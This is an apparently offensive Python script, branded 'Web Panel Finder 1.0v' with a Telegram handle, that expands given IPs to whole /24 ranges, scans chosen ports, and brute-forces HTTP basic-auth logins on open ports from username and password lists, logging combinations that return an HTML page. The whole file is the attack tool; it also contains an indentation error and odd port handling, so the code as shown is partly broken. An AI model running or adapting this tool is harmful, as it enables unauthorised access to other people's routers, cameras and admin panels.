import socket, threading, ports, os
from requests import get
def cls():
	os.system('cls' if os.name=='nt' else 'clear')
cls()
print("""
          ⣀⣤⡴⠶⠟⠛⠛⠛⠛⠻⠶⢦⣤            
       ⣠⣴⡟⠋             ⠙⢻⣦     
    ⣠⡾⠋               ⣠⣶⣿ ⠙⢷⣄   
  ⣴⠏               ⣀⣴⠟⠉⣸⠇   ⠹⣦  
 ⣼⠏            ⣦⣴⠾⠋   ⢰⡟     ⠹⣧   
⢰⡏          ⣤⡾⠋⠙      ⣾⠁      ⢹⡆  Web Panel Finder 1.0v 
⣿⠁       ⣸⣷⠛⠁        ⣾⣇        ⣿     t.me/memshack
⣿     ⣠⣴⠟⠉           ⣾⡟         ⣿
⣿  ⢀⣴⠞⠋              ⣾          ⣿
⠸⣧⠾⠿⠷⠶⠶⠶⠶⠶⠶⢾      ⡷         ⣼⠇
 ⢻⣆            ⢿⡄  ⢠⡿        ⣰⡟ 
  ⠻⣆           ⠘⣷  ⣾⠃       ⣰⠟  
    ⠙⢷⣄         ⢹⣇⣸⡏      ⣠⡾    
       ⠙⠳⣦⣄⡀     ⢿⡿  ⢀⣠⣴⠞⠋      
           ⠉⠛⠳⠶⣦⣤⣼⣧⣤⣴⠶⠞⠛⠛⠛⠉⠉⠉ 
	""")
ports_list = ports.check()
logins = ports.logi()
passw = ports.passw()
print("Used ports:")
for read_port_list in range(len(ports_list)):
	print(">>", ports_list[read_port_list])
Yn = input("Add ports[y/N]: ")
if Yn == "y":
	while True:
		add_port_in_port_list = input("Enter port -->> ")
		print("\nEnter \"END\" for exit")
		if add_port_in_port_list == "END":
			break
		else:
			ports_list.append(add_port_in_port_list)
	pass
ip_list = input("Enter IP list.\nExample:\n 192.168.0.1 0.0.0.0 127.0.0.0 etc...\n -->>").split(" ")
for x_ip_r in range(len(ip_list)):
	edit_ip = str(ip_list[x_ip_r]).split(".")
	edit_ip_pl = ""
	super_ip_list = []
	for del_last in range(3):
		edit_ip_pl += str(edit_ip[del_last])+"."
	for test_x in range(255):
		pls = str(edit_ip_pl)+str(test_x)
		super_ip_list.append(pls)
		pass
def potoc (name):
	stop = 0
	res_text = ""
	for read_ip_list in range(len(super_ip_list)):
		target = super_ip_list[read_ip_list]
		print(res_text)
		print("Target", target)
		for use_port_list in range(len(ports_list)):
			port = ports_list[use_port_list]
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(1)
			result = sock.connect_ex((target,int(port)))
			if(result == 0):
				if str(port)=='443':
					thprot = "http://"
					port="80"
				else:
					thprot = "http://"
				if stop == 1:
					stop = 0
				for x_logi in range(len(logins)):
					if stop == 1:
						break
					for x_passw in range(len(passw)):
						print(thprot+logins[x_logi]+":"+passw[x_passw]+"@"+target+":"+port)
						try:
						pss = get(thprot+logins[x_logi]+":"+passw[x_passw]+"@"+target+":"+port)
							try:
								if pss.headers["Content-Type"] == "text/html":
									res_text += ">>> "+thprot+logins[x_logi]+":"+passw[x_passw]+"@"+target+":"+port+"\n"
									stop = 1
									break
							except:
								pass
						except:
							pass
		cls()
		sock.close()
potoc(0)
